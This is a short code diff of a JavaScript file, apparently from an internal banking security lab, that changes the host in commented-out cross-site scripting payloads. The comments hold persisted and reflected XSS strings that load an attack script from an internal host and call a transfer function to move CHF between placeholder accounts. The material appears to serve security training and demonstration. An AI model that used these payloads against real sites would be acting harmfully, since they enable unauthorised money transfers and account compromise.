@@ -70,7 +70,7 @@ function submitTransferForm(formname, fromAccount) {
     }
 }
 //persisted XSS:
-//<script src="http://sprg-owasp.el.eee.intern:9090/files/vargadan/attack.js"></script><script>transfer("attackForm1","FROM_ACCOUNT_NO","TO_ACCOUNT_NO","100","CHF")</script>
+//<script src="http://sprg-tools.el.eee.intern:9090/files/vargadan/attack.js"></script><script>transfer("attackForm1","FROM_ACCOUNT_NO","TO_ACCOUNT_NO","100","CHF")</script>
 //<script src="http://sprg-owasp.el.eee.intern:9090/files/vargadan/attack.js"></script><script>transfer("attackForm1","FROM_ACCOUNT_NO","TO_ACCOUNT_NO","10000","CHF")</script>
 //reflected XSS:
 //http://sprg-vbank.el.eee.intern/history?accountNo=FROM_ACCOUNT_NO' -- <script src="http://sprg-owasp.el.eee.intern:9090/files/vargadan/attack.js"></script><script>transfer(null,"FROM_ACCOUNT_NO","TO_ACCOUNT_NO","888","CHF")</script>
